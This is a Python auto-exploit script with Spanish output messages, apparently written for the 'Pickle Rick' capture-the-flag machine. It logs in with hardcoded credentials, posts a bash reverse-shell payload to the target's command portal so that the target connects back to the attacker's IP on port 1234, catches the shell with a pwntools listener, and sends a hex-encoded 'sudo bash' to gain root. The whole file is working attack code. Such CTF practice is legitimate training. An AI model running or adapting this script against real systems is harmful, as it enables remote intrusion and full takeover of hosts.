import requests,sys,signal
from pwn import *

Colors = {
    'red': '\033[31m',
    'green': '\033[32m',
    'yellow': '\033[33m',
    'blue': '\033[34m',
    'purple': '\033[35m',
    'cyan': '\033[36m',
    'grey': '\033[37m',
    'reset': '\033[0m'
}

def exiting():
    print(Colors['red']+"\n[!] saliendo...\n"+Colors['reset'])
    sys.exit(1)

if len(sys.argv) < 3:
    print(Colors['yellow'] + f'\n[!] Uso: python3 {sys.argv[0]} "IP"  "Victim_IP"' + Colors['reset'] )
    exiting()

s = requests.Session()
victim = f'http://{sys.argv[2]}/login.php'
victim_portal = f'http://{sys.argv[2]}/portal.php'

def controlc(sig, frame):
    print(Colors['red']+"\n\n[!] saliendo...\n"+Colors['reset'])
    sys.exit(1)

signal.signal(signal.SIGINT, controlc)

def wait():
    for i in range(3):
        print(Colors['purple'] + ".", end='')
        time.sleep(0.8)
    print(Colors['reset'] + '\n')
    return

def success():
    print(Colors['green'] + "\t¡Completado!"+ Colors['reset'])
    sleep(1)

def login():

    post_data= {
        'username': 'R1ckRul3s',
        'password': 'Wubbalubbadubdub',
        'sub':'Login'
    }
    print(Colors['purple']+"\nIniciando sesión en la página"+Colors['reset'],end='')
    wait()
    r = s.post(victim,data=post_data)
    success()

def shell():
    payload = f'bash -c "bash -i >& /dev/tcp/{sys.argv[1]}/1234 0>&1"'

    post_data={
        'command': payload,
        'sub' : 'Execute'
    }
    r = s.post(victim_portal,data=post_data)

if __name__ == '__main__':
    login()
    print(Colors['purple']+"\nEstableciendo la conexión reversa"+Colors['reset'],end='')
    wait()
    try:
        threading.Thread(target=shell, args=()).start()
    except Exception as e:
        log.error(str(e))
    
    shell = listen(1234, timeout=15).wait_for_connection()

    if shell.sock is None:
        print(Colors['red'] + "\nNo se ha obtenido ninguna conexión :(" + Colors['reset'])
        sleep(1)
        exiting()
    else:
        print('\n')
        success()
        print(Colors['green'] + "\n\t[+]Conexión establecida como usuario www-data\n" + Colors['reset'])
        time.sleep(1)
    
    print(Colors['purple'] + "\nIniciando escalada de privilegios" + Colors['reset'],end='')
    wait()
    shell.sendline(b'\x73\x75\x64\x6f\x20\x62\x61\x73\x68')
    print(Colors['green'] + "\nPwned!!!\n" + Colors['reset'])
    shell.interactive()
